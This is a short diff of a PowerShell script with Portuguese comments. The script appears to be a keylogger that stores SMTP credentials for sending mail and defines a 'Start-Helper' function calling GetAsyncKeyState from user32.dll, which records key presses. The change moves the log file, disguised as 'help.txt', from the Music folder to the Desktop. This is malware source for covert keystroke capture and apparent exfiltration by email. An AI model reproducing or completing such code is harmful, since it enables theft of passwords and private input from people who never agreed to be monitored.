@@ -27,7 +27,7 @@ $SMTPPort = "587"
 $credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
 # Requer PowerShell versão 2
-function Start-Helper($Path=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('MyMusic'), 'help.txt')) {
+function Start-Helper($Path=[System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'help.txt')) {
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
